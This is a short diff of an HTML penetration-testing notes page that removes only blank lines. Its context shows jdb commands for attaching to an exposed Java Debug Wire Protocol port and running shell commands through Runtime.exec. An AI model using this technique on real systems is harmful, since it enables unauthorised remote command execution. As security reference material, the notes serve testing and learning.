@@ -334,14 +334,12 @@ new Java codebase.</li>
 </ul>
 <pre><code class="language-bash">java -jar cfr-0.150.jar /path/to/jar --outputdir /path/output/dir
 </code></pre>
-
 <h2 id="java-debug-wire-protocol-jdwp">Java Debug Wire Protocol (JDWP)</h2>
 <p><code>JWDP</code> is the protocol used for communication between a debugger and a Java app (JVM).</p>
 <h3 id="manual-exploitation">Manual exploitation</h3>
 <p>It's possible to execute shell commands using <code>jdb</code>:</p>
 <pre><code class="language-bash">jdb -attach 8000
 </code></pre>
-
 <p>Then you need to find a good java thread to stop in and execute you command. It
 appears that the method <code>indexOf</code> of the <code>String</code> class is a good candidate:</p>
 <pre><code class="language-bash">trace go methods
@@ -349,7 +347,6 @@ appears that the method <code>indexOf</code> of the <code>String</code> class is
 stop in java.lang.String().indexOf(int)
 print new java.lang.Runtime().exec(&quot;&lt;cmd&gt;&quot;)
 </code></pre>
-
 <p>This should execute you command with the privilege of the Java application. But
 be careful, the manual method often fails.</p>
 <h3 id="jdwp-shellifier">jdwp-shellifier</h3>
